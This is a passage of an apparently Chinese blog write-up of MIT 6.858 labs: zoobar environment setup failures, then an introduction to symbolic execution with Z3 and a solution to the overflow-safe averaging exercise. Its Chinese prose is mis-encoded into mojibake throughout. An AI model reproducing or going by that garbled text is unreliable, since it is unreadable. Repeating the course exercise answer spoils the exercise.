-std=c99 -Wall -Wno-format-overflow -D_GNU_SOURCE -static   -c -o http2.o http2.c<br>cc -m64  zookfs.o http2.o   -o zookfs<br>cc -m64 -g -std=c99 -Wall -Wno-format-overflow -D_GNU_SOURCE -static   -c -o zookd2.o zookd2.c<br>cc -m64  zookd2.o http2.o   -o zookd2<br></code></pre></td></tr></table></figure><h2 id="Prelude-Whatâ€™s-a-zoobar"><a href="#Prelude-Whatâ€™s-a-zoobar" class="headerlink" title="Prelude: Whatâ€™s a zoobar?"></a>Prelude: Whatâ€™s a zoobar?</h2><p>ä¸ºäº†ç†è§£ <code>zoobar</code>ï¼Œæˆ‘ä»¬é¦–å…ˆè¿‡ä¸€ä¸‹éƒ¨åˆ†æºç </p><p><code>zoobar</code> çš„ä¸€ä¸ªé‡è¦ç‰¹æ€§æ˜¯å…è®¸åœ¨ç”¨æˆ·ä¹‹é—´ä¼ é€’å‡­è¯ï¼ˆcreditsï¼‰ï¼Œè¿™ç”± <code>transfer.py</code> å®ç°ï¼Œæˆ‘ä»¬å¯ä»¥å¯åŠ¨ zoobar æ„Ÿå—ä¸€ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./zookld.py</span><br></code></pre></td></tr></table></figure><p>è¿™ç©æ„éœ€è¦ python çš„ <code>lxc</code> æ¨¡å—æ‰èƒ½è·‘ï¼Œä½†æ˜¯ç¬”è€…æ€ä¹ˆéƒ½å®‰ä¸ä¸Šâ€¦<del>lab2 å°±æ­¤å®Œç»“</del> </p><p>ç¬”è€…æœ€ç»ˆé€‰æ‹©  <em>æ”¾å¼ƒä½¿ç”¨è‡ªå·±æ­å»ºçš„å®éªŒç¯å¢ƒ</em>  ï¼Œé‡æ–°ä½¿ç”¨ MIT æä¾›çš„ VM é•œåƒç¯å¢ƒå»åšå®éªŒï¼Œä½†æ˜¯åœ¨æ‰§è¡Œ <code>./zookld.py</code> æ—¶åˆé‡åˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼š</p><p><img src="https://s2.loli.net/2022/12/07/E5rjcJBSFHQOifo.png" alt="image.png"></p><p>é‚£ä¹ˆè¿™ä¸ªé—®é¢˜çš„å‡ºç°æ˜¯å› ä¸º <strong>Ubuntu 21.10 å·²ç»åœæ­¢æ›´æ–°</strong>ï¼Œæˆ‘ä»¬æ¥çœ‹ <code>zookld.py</code> çš„é€»è¾‘ï¼Œæ¯”è¾ƒç®€å•ï¼Œä¸»è¦å°±æ˜¯ç›´æ¥è°ƒç”¨ <code>zookconf.py</code> é‡Œçš„ <code>boot()</code> å‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> zookconf<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) == <span class="hljs-number">2</span>:<br>        zookconf.boot(sys.argv[<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">else</span>:<br>        zookconf.boot()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    zookconf.restart_with_cgroups()<br>    <span class="hljs-keyword">if</span> os.geteuid() == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;WARNING: Running zookld.py as root! In order to clean up &quot;</span><br>        <span class="hljs-string">&quot;containers from this run, you must run zookclean.py as root as well.&quot;</span>,<br>        file=sys.stderr)<br>    main()<br></code></pre></td></tr></table></figure><p>é‡Œé¢å­˜åœ¨è¿™æ ·ä¸€ä¸ªè°ƒç”¨é“¾ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">boot()<br>Container.__init__()<br>    Container.make_container()<br>        Container.make_base()<br>            Container.configure_base()<br></code></pre></td></tr></table></figure><p>åœ¨ <code>configure_base()</code> ä¸­æœ‰ç€ä¸€ä¸ªè°ƒç”¨ <code>apt-get</code> çš„é€»è¾‘ï¼Œç”±äº <strong>Ubuntu 21.10 å·²ç» <a href="https://help.ubuntu.com/community/EOLUpgrades">EOL</a> äº†ï¼Œæ‰€ä»¥è¿™ä¸€æ­¥æ˜¯å¿…ç„¶ä¼šå¤±è´¥çš„</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">configure_base</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># ...</span><br>    <span class="hljs-comment"># install packages for zoobar</span><br>    <span class="hljs-comment"># terminate early if anything goes wrong here</span><br>    r = self.run_cmd([<span class="hljs-string">&quot;apt-get&quot;</span>, <span class="hljs-string">&quot;update&quot;</span>], extra_env_vars=ev)<br>    <span class="hljs-keyword">if</span> r != <span class="hljs-number">0</span>:<br>        self.errormsg(<span class="hljs-string">&quot;Failed updating apt package info&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br>    r = self.run_cmd([<span class="hljs-string">&quot;apt-get&quot;</span>, <span class="hljs-string">&quot;install&quot;</span>, <span class="hljs-string">&quot;-y&quot;</span>] + pkgs, extra_env_vars=ev)<br>    <span class="hljs-keyword">if</span> r != <span class="hljs-number">0</span>:<br>        self.errormsg(<span class="hljs-string">&quot;Failed installing packages&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><blockquote><p>å‚è§ <a href="https://askubuntu.com/questions/1420190/upgrade-to-22-04-impish-release-no-longer-has-a-release-file">ask ubuntu</a> ä¸ <a href="https://fridge.ubuntu.com/2022/07/19/ubuntu-21-10-impish-indri-end-of-life-reached-on-july-14-2022/">Ubuntu Fridge</a></p><blockquote><p><del>ğŸ‘´çœŸçš„éº»äº†ï¼Œè¿™å®éªŒâ„¢æ˜¯ MIT ä»Šå¹´æ˜¥å­£å­¦æœŸå‘å¸ƒçš„ï¼Œç”¨ä¸ª 20.04 è¿™æ ·çš„ LTS ä¸å¥½ğŸï¼Œç”¨ä¸ªå°±åªå‰©å‡ ä¸ªğŸˆ·å¯¿å‘½çš„ 21.10 å°±ç¦»è°±</del></p></blockquote></blockquote><p>MIT ä¼°è®¡æ˜¯ä¸ä¼šä¿®è¿™ä¸ªé—®é¢˜äº†ï¼Œè€Œä¸‹ä¸€æ¬¡çš„å®éªŒæ‰‹å†Œå¾—ç­‰åˆ° 2023 å¹´çš„æ˜¥å­£å­¦æœŸæ‰èƒ½ä¸Šçº¿ï¼Œé‚£è¿™é‡Œç¬”è€…åªèƒ½è‡ªè¡Œå°è¯•è§£å†³è¿™ä¸ªé—®é¢˜äº†: (</p><p>è¿™é‡Œç¬”è€…è¯•äº†å¥½å‡ ç§æ–¹æ³•éƒ½æ²¡èƒ½æˆåŠŸå°† Ubuntu 21.10 å‡çº§æˆ 22.04 æˆ–æ˜¯å…¶ä»–çš„å¯ç”¨ç‰ˆæœ¬ï¼Œæœ€åç¬”è€…å°† <code>apt-get</code> æ›¿æ¢æˆ <code>apt</code> ä¹‹åå€’æ˜¯èƒ½è·‘äº†ï¼Œä¸è¿‡<strong>æ— æ³•æ­£å¸¸è®¿é—® zoobar æœåŠ¡å™¨</strong>ï¼Œä¼šæŠ¥ä¸€ä¸ª module not found ä½†æ˜¯å®é™…ä¸Šå·²ç»å®‰è£…æœ‰å¯¹åº”æ¨¡å—çš„é”™è¯¯ : (</p><blockquote><p>è¿™é‡Œå…ˆğŸ•Šäº†ï¼Œè¦æ˜¯ä¹‹åèƒ½é‡æ–°åšä¸Šå†è¡¥ï¼Œè¿˜å¥½å‡ ä¸ª lab ä¹‹é—´å¹¶éä¾èµ–å…³ç³»å¯ä»¥è®©ç¬”è€…å…ˆå¾€åç»§ç»­åš lab3 : )</p></blockquote><h1 id="0x03-Lab-3-Symbolic-execution"><a href="#0x03-Lab-3-Symbolic-execution" class="headerlink" title="0x03.Lab 3: Symbolic execution"></a>0x03.Lab 3: Symbolic execution</h1><h2 id="Introduction-1"><a href="#Introduction-1" class="headerlink" title="Introduction"></a>Introduction</h2><p>æœ¬ lab å°†æ•™å¤§å®¶ä½¿ç”¨ <strong>ç¬¦å·æ‰§è¡Œ</strong> ï¼ˆ<strong>symbolic execution</strong>ï¼‰ è¿™ä¸€å¼ºå¤§çš„æŠ€æœ¯æ¥å¯»æ‰¾è½¯ä»¶ä¸­çš„æ¼æ´ï¼Œåœ¨ lab çš„æœ€åæˆ‘ä»¬å°†å»ºç«‹ä¸€ä¸ªå¯ä»¥åœ¨ zoobar web åº”ç”¨ä¸­å¯»æ‰¾è§¦å‘å¤šç§æ¼æ´çš„ç¬¦å·æ‰§è¡Œç³»ç»Ÿï¼ˆå‡†ç¡®çš„è¯´æ˜¯ä¸€ä¸ª<strong>æ··åˆæ‰§è¡Œ</strong>ï¼ˆconcolic executionï¼‰ç³»ç»Ÿï¼‰</p><blockquote><p>å…³äºä»€ä¹ˆæ˜¯ concolic executionï¼Œå¯ä»¥çœ‹è¿™å¼ å›¾</p><p><img src="https://s2.loli.net/2022/10/27/Fvl3yRNMnzKamfk.jpg" alt="concolic execution"></p></blockquote><p>åœ¨ <a href="http://css.csail.mit.edu/6.858/2022/readings/exe.pdf">EXE paper</a> ä¸­æè¿°äº†ä¸€ä¸ªç”¨äº C ç¨‹åºçš„ç¬¦å·æ‰§è¡Œç³»ç»Ÿï¼Œä¸ºäº†ç®€å•åŒ–ï¼Œè¯¥ lab å°†é€šè¿‡ä¿®æ”¹ Python å¯¹è±¡ä¸é‡è½½ç‰¹å®šæ–¹æ³•æ¥ä¸º Python ç¨‹åºå»ºç«‹ä¸€ä¸ªç¬¦å·&#x2F;æ··åˆæ‰§è¡Œç³»ç»Ÿï¼Œç±»ä¼¼äº EXEï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ä¸€ä¸ª SMT ï¼ˆ <a href="https://en.wikipedia.org/wiki/Satisfiability_Modulo_Theories">Satisfiability Modulo Theories</a>ï¼Œå¯æ»¡è¶³æ€§æ¨¡ç†è®ºï¼‰æ±‚è§£å™¨æ¥æ£€æŸ¥å¯æ»¡è¶³çš„çº¦æŸï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬çš„æ±‚è§£å™¨å¯ä»¥æ£€æŸ¥åŒæ—¶åŒ…å«ä¼ ç»Ÿå¸ƒå°”å¯æ»¡è¶³æ€§è¡¨è¾¾å¼ä¸æ¶‰åŠå…¶ä»–â€œç†è®ºâ€çš„çº¦æŸå¦‚æ•´å‹ã€ä½å‘é‡ã€å­—ç¬¦ä¸²ç­‰</p><p>æœ¬ lab åˆå§‹æˆ‘ä»¬é¦–å…ˆè¦é€šè¿‡è®¡ç®— 32 ä½æœ‰&#x2F;æ— ç¬¦å·æ•°çš„å¹³å‡å€¼æ¥ç†Ÿæ‚‰ <strong>Z3</strong>â€”â€”ä¸€ä¸ªæµè¡Œçš„ SMT æ±‚è§£å™¨ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°†ä¸º Python æ•´å‹æ“ä½œåˆ›å»º wrappersï¼ˆç±»ä¼¼ EXE æä¾›äº†ç¬¦å·å˜é‡ä¸Šçš„æ“ä½œç½®æ¢ï¼‰ï¼Œå¹¶åº”ç”¨è°ƒç”¨ Z3 çš„æ ¸å¿ƒé€»è¾‘æ¥æ¢ç´¢å¯èƒ½çš„ä¸åŒæ‰§è¡Œè·¯å¾„ï¼›æœ€ç»ˆæˆ‘ä»¬å°†æ¢ç´¢å¦‚ä½•å°†å…¶åº”ç”¨åœ¨ web åº”ç”¨ç¨‹åºä¸Šï¼Œä»¥å¯¹å­—ç¬¦ä¸²è¿›è¡Œæ±‚è§£ï¼Œæˆ‘ä»¬å°†ä¸º Python çš„å­—ç¬¦ä¸²æ“ä½œå¥—ä¸€å±‚ wrapperï¼Œåœ¨ SQLalchemy æ•°æ®åº“æ¥å£ä¸Šåº”ç”¨å¯¹ç¬¦å·åŒ–å‹å¥½çš„ï¼ˆsymbolic-friendlyï¼‰wrapperï¼Œå¹¶ä½¿ç”¨è¿™ä¸ªç³»ç»Ÿå¯»æ‰¾ Zoobar ä¸­çš„æ¼æ´</p><blockquote><p>ä¸Šé¢ä¸¤æ®µéƒ½æ˜¯æŠ„å®éªŒæ‰‹å†Œçš„</p></blockquote><p>æ¥ä¸‹æ¥é¦–å…ˆè¿˜æ˜¯æƒ¯ä¾‹åœ°åˆ‡æ¢åˆ° lab 3 çš„åˆ†æ”¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git commit -am <span class="hljs-string">&#x27;lab2 completed&#x27;</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git pull</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git checkout -b lab3 origin/lab3</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ³¨æ„ä¸è¦å°† lab 2 çš„ä»£ç åˆå¹¶åˆ° lab 3 é‡Œè¾¹ï¼Œå› ä¸ºæˆ‘ä»¬çš„ç¬¦å·æ‰§è¡Œç³»ç»Ÿæ— æ³•é€šè¿‡ RPC è¿½è¸ªå¤šè¿›ç¨‹é—´çš„ç¬¦å·çº¦æŸï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ä¸€ä¸ªæ²¡æœ‰è¿›è¡Œæƒé™åˆ†ç¦»çš„ Zoobar ä¸Šè¿›è¡Œç¬¦å·æ‰§è¡Œ</p><p>æ¥ä¸‹æ¥æ˜¯æ£€æŸ¥ä»£ç å¯ç”¨æ€§ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check</span><br></code></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹å°±ğŸ†—ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ç¬¦å·æ‰§è¡Œç³»ç»Ÿæ˜¯ CPU å¯†é›†å‹çš„ï¼Œå› æ­¤å¯¹äºä¸å¼€å¯ KVM æ”¯æŒçš„ QEMU è€Œè¨€ä¼šéå¸¸æ…¢ï¼š</p><p><img src="https://s2.loli.net/2022/12/12/AlWaHU6RhcE3TpN.png" alt="image.png">ã€</p><h2 id="Using-an-SMT-solver"><a href="#Using-an-SMT-solver" class="headerlink" title="Using an SMT solver"></a>Using an SMT solver</h2><p>ç¬¦å·æ‰§è¡Œçš„æ ¸å¿ƒæ˜¯ <strong>å¯æ»¡è¶³æ€§æ¨¡ç†è®ºæ±‚è§£å™¨</strong>ï¼ˆ<strong>Satisfiability Modulo Theory solver</strong>ï¼Œ å³ <code>SMT solver</code>ï¼‰ï¼Œåœ¨æœ¬ lab ä¸­æˆ‘ä»¬å°†ä½¿ç”¨å¾®è½¯å¼€å‘çš„ <a href="https://github.com/Z3Prover/z3">Z3 solver</a> çš„ Python-based APIï¼ˆå‚è§ <a href="https://ericpony.github.io/z3py-tutorial/">z3py tutorial</a> &amp; <a href="https://z3prover.github.io/api/html/namespacez3py.html">documentation for Z3â€™s Python API</a>ï¼‰ï¼Œå¹¶ä½¿ç”¨  <a href="https://rise4fun.com/z3/tutorialcontent/sequences">Z3â€™s support for strings</a>ï¼›æœ¬ Lab å¸¦æœ‰ä¸€ä¸ªæ„å»ºè‡ª <a href="https://github.com/Z3Prover/z3">Z3 github repo</a> çš„ Z3</p><p>å®éªŒæä¾›äº† <code>int-avg.py</code> ä½œä¸ºä½¿ç”¨ Z3 çš„ä¾‹å­ï¼š  <em>è®¡ç®—ä¸¤ä¸ª 32 ä½æ•´å‹çš„å¹³å‡å€¼</em>  ï¼Œä¸€ä¸ªæœ€ç®€å•çš„ç®—æ³•æ˜¯ <code>(x + y) / 2</code> ï¼Œä½†è¿™å¯èƒ½ä¼šå‘ç”Ÿ<strong>æ•´å‹ä¸Šæº¢</strong>ï¼Œä»è€Œå¾—åˆ°  <em>æ¨¡ 2<sup>32</sup></em> ä¸Šçš„å€¼ï¼ˆæƒ³äº†è§£æ›´å¤šï¼Œå‚è§  <a href="https://people.csail.mit.edu/nickolai/papers/wang-kint-2013-06-24.pdf">KINT paper</a> ï¼‰â€”â€”Z3 å¯ä»¥å¸®æˆ‘ä»¬æ£€æŸ¥è¿™ä¸ªé”™è¯¯ï¼šäºˆå…¶ä¸€ä¸ªå¸ƒå°”è¡¨è¾¾å¼ï¼ŒZ3 å¯ä»¥å‘Šè¯‰æˆ‘ä»¬å…¶<strong>æ˜¯å¦ä¸ºçœŸ</strong>ï¼ˆå³å¯ä»¥è¢«æ»¡è¶³ï¼‰ï¼›è‹¥è¡¨è¾¾å¼å¯ä»¥ä¸ºçœŸä¸”åŒ…å«ä¸€äº›å˜é‡ï¼ŒZ3 å¯ä»¥ç»™æˆ‘ä»¬ä¸€äº›ä½¿è¡¨è¾¾å¼ä¸ºçœŸçš„ğŸŒ°å˜é‡</p><p>ç°åœ¨æˆ‘ä»¬æ¥çœ‹è¿™ä»½ä»£ç ï¼ˆè¿™é‡Œä¸ä¼šä»”ç»†è®² Z3 çš„ç”¨æ³•ï¼Œä¸æ‡‚çš„ <a href="https://z3prover.github.io/api/html/">è‡ªè¡ŒæŸ¥æ–‡æ¡£</a>ï¼‰ï¼Œå…¶é¦–å…ˆä¼šä½¿ç”¨ Z3 åˆ›å»ºä¸¤ä¸ª 32 ä½çš„ä½å‘é‡ a ä¸ bï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> z3<br><br><span class="hljs-comment">## Construct two 32-bit integer values.  Do not change this code.</span><br>a = z3.BitVec(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">32</span>)<br>b = z3.BitVec(<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-number">32</span>)<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åˆ†åˆ«è®¡ç®—æœ‰&#x2F;æ— ç¬¦å·é™¤æ³•ä¸‹ä¸¤æ•°çš„å¹³å‡å€¼ï¼Œæ³¨æ„è¿™é‡Œ<strong>å¹¶æ²¡æœ‰å®é™…è¿›è¡Œè®¡ç®—ï¼Œè€Œä»…æ˜¯ä¿å­˜äº†ç¬¦å·å˜é‡è¡¨è¾¾å¼</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Compute the average of a and b.  The initial computation we provided</span><br><span class="hljs-comment">## naively adds them and divides by two, but that is not correct.  Modify</span><br><span class="hljs-comment">## these lines to implement your solution for both unsigned (u_avg) and</span><br><span class="hljs-comment">## signed (s_avg) division.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## Watch out for the difference between signed and unsigned integer</span><br><span class="hljs-comment">## operations.  For example, the Z3 expression (x/2) performs signed</span><br><span class="hljs-comment">## division, meaning it treats the 32-bit value as a signed integer.</span><br><span class="hljs-comment">## Similarly, (x&gt;&gt;16) shifts x by 16 bits to the right, treating it</span><br><span class="hljs-comment">## as a signed integer.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## Use z3.UDiv(x, y) for unsigned division of x by y.</span><br><span class="hljs-comment">## Use z3.LShR(x, y) for unsigned (logical) right shift of x by y bits.</span><br>u_avg = z3.UDiv(a + b, <span class="hljs-number">2</span>)<br>s_avg = (a + b) / <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>ç”±äº 32 ä½æ•´æ•°åŠ æ³•å¯èƒ½å­˜åœ¨æº¢å‡ºï¼Œæ•…è¿™é‡Œä¸ºäº†æ±‚å¾—å…¶æ­£ç¡®çš„å¹³å‡å€¼ï¼Œæˆ‘ä»¬å°†å…¶æ‰©å±•ä¸ºä¸¤ä¸ª 33 ä½çš„ä½å‘é‡ï¼Œå®Œæˆè®¡ç®—åå†æˆªæ–­å› 32 ä½ï¼ˆä¸ä¼šå¯¼è‡´ç»“æœé”™è¯¯ï¼Œå› ä¸º 32 ä½çš„å¹³å‡å€¼æ€»ä¼šåœ¨ 32 ä½å†…ï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Do not change the code below.</span><br><br><span class="hljs-comment">## To compute the reference answers, we extend both a and b by one</span><br><span class="hljs-comment">## more bit (to 33 bits), add them, divide by two, and shrink back</span><br><span class="hljs-comment">## down to 32 bits.  You are not allowed to &quot;cheat&quot; in this way in</span><br><span class="hljs-comment">## your answer.</span><br>az33 = z3.ZeroExt(<span class="hljs-number">1</span>, a)<br>bz33 = z3.ZeroExt(<span class="hljs-number">1</span>, b)<br>real_u_avg = z3.Extract(<span class="hljs-number">31</span>, <span class="hljs-number">0</span>, z3.UDiv(az33 + bz33, <span class="hljs-number">2</span>))<br><br>as33 = z3.SignExt(<span class="hljs-number">1</span>, a)<br>bs33 = z3.SignExt(<span class="hljs-number">1</span>, b)<br>real_s_avg = z3.Extract(<span class="hljs-number">31</span>, <span class="hljs-number">0</span>, (as33 + bs33) / <span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>æœ€åå°±æ˜¯æ±‚è§£æ˜¯å¦å­˜åœ¨èƒ½å¤Ÿå‘ç”Ÿæ•´å‹æº¢å‡ºçš„çº¦æŸï¼Œå³ï¼šæ˜¯å¦å­˜åœ¨è¿™æ ·çš„ä¸¤ä¸ª 32 ä½æ•´å‹å˜é‡å€¼ä½¿å¾—å…¶ 32 ä½ä¸‹è¿ç®—ç»“æœä¸ä¸çœŸå®è®¡ç®—ç»“æœç›¸ç­‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">printable_val</span>(<span class="hljs-params">v, signed</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(v) == z3.BitVecNumRef:<br>        <span class="hljs-keyword">if</span> signed:<br>            v = v.as_signed_long()<br>        <span class="hljs-keyword">else</span>:<br>            v = v.as_long()<br>    <span class="hljs-keyword">return</span> v<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printable_model</span>(<span class="hljs-params">m, signed</span>):<br>    vals = &#123;&#125;<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> m:<br>        vals[k] = printable_val(m[k], signed)<br>    <span class="hljs-keyword">return</span> vals<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do_check</span>(<span class="hljs-params">msg, signed, avg, real_avg</span>):<br>    e = (avg != real_avg)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Checking&quot;</span>, msg, <span class="hljs-string">&quot;using Z3 expression:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;    &quot;</span> + <span class="hljs-built_in">str</span>(e).replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;\n    &quot;</span>))<br>    solver = z3.Solver()<br>    solver.add(e)<br>    ok = solver.check()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Answer for %s: %s&quot;</span> % (msg, ok))<br><br>    <span class="hljs-keyword">if</span> ok == z3.sat:<br>        m = solver.model()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Example:&quot;</span>, printable_model(m, signed))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Your average:&quot;</span>, printable_val(m.<span class="hljs-built_in">eval</span>(avg), signed))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Real average:&quot;</span>, printable_val(m.<span class="hljs-built_in">eval</span>(real_avg), signed))<br></code></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹ï¼ŒZ3 æ±‚è§£å™¨å¸®åŠ©æˆ‘ä»¬æ‰¾åˆ°äº†è¿™æ ·çš„å€¼ï¼š</p><p><img src="https://s2.loli.net/2022/12/12/LekmYMWvfAUSNwy.png" alt="image.png"></p><p>æ¥ä¸‹æ¥æ˜¯ Exercise 1ï¼šé€šè¿‡ä¿®æ”¹  <code>int-avg.py</code> ä¸­çš„ <code>u_avg = ...</code> ä¸€è¡Œï¼Œå®ç°ä¸€ä¸ªæ­£ç¡®çš„å‡½æ•°ï¼Œä»¥åœ¨ 32 ä½è¿ç®—ä¸‹æ­£ç¡®è®¡ç®—å‡º a ä¸ b çš„æ— ç¬¦å·å¹³å‡å€¼ï¼Œä¸èƒ½æ”¹å˜æ“ä½œæ•°çš„ä½å®½</p><blockquote><p><strong>Exercise 1.</strong> Implement a correct function to compute the unsigned average of <code>a</code> and <code>b</code> using only 32-bit arithmetic, by modifying the <code>u_avg = ...</code> line in <code>int-avg.py</code>.</p><p>For the purposes of this exercise, you are not allowed to change the bit-widths of your operands. This is meant to represent the real world, where you cannot just add one more bit to your CPUâ€™s register width.</p><p>You may find it helpful to search online for correct ways to perform fixed-width integer arithmetic. The book <a href="https://web.archive.org/web/20190915025154/http://www.hackersdelight.org/">Hackerâ€™s Delight</a> by Henry S. Warren is a particularly good source of such tricks.</p><p>Check your averaging function by re-running <strong>.&#x2F;int-avg.py</strong> or <strong>make check</strong>. If your implementation is correct, <code>int-avg.py</code> should produce the message <code>Answer for unsigned avg: unsat</code>.</p></blockquote><p>è¿™é‡Œç¬”è€…ç»™å‡ºä¸€ä¸ªæ¯”è¾ƒç¬¨çš„è§£æ³•ï¼ˆæ¯•ç«Ÿç¬”è€…çš„è„‘å­:  (ä¹Ÿæƒ³ä¸å‡ºå•¥èªæ˜è§£æ³• ï¼‰ï¼š</p><ul><li><strong><code>(a / 2) + (b / 2) + ((a % 2) + (b % 2)) / 2</code></strong></li></ul><p>è¿™ä¸ªç®—æ³•çš„æ€è·¯æ¯”è¾ƒç®€å•ï¼Œæœ€åˆçš„å‡ºå‘ç‚¹å°±æ˜¯ä¸¤æ•°ä¹‹å’Œçš„å¹³å‡å€¼ä¸ä¼šè¶…å‡º 2<sup>32</sup>ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦å…ˆå°†ä¸¤æ•°åˆ†åˆ«é™¤ä»¥2å†ç›¸åŠ å°±ä¸ä¼šå‘ç”Ÿæº¢å‡ºäº†ï¼Œä½†æ˜¯å¥‡æ•°é™¤ä»¥2ä¼šä¸¢å¤± 0.5ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªæ•°éƒ½æ˜¯å¥‡æ•°çš„è¯æœ€åçš„ç»“æœä¼šä¸¢æ‰1ï¼Œé‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å†å°†å…¶åŠ ä¸Šå³å¯</p><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ Z3 <strong>é»˜è®¤ä¸ºå¸¦ç¬¦å·è¿ç®—</strong>ï¼Œæ•…è¿™é‡Œæˆ‘ä»¬åº”å½“ä½¿ç”¨ <code>z3.UDiv()</code> æ¥è¿›è¡Œ<strong>æ— 